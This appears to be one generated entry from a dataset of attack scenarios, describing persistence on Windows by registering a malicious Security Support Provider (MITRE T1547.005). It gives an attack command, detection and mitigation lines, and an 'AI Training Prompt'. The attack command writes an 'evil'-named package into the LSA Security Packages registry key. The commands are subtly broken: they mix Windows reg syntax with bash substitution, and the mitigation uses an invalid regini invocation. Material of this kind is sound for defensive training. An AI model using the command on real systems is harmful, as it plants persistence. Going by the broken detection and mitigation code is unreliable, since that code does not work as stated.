---
type: campaign
scenario_id: 274
tactic: Persistence
technique: "T1547.005: Security Support Provider"
technique_id: T1547.005
tags: [campaign, lotl, persistence]
---

# Registering malicious SSP remotely for persistence.

## Threat Description
Registering malicious SSP remotely for persistence.

## Attack Command
```
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v Security Packages /t REG_MULTI_SZ /d "$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8))\0kerberos"
```

## Detection Logic
Monitor SSP changes: `reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v Security Packages | findstr evil`; Event ID 4657.

## Mitigation
Restrict LSA writes: `regini -h deny "HKLM\System\CurrentControlSet\Control\Lsa"`; Audit SSP changes.

## AI Training Prompt
Train AI to detect SSP tampering and suggest registry protections.

## References
- MITRE ATT&CK T1547.005: https://attack.mitre.org/techniques/T1547/005/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
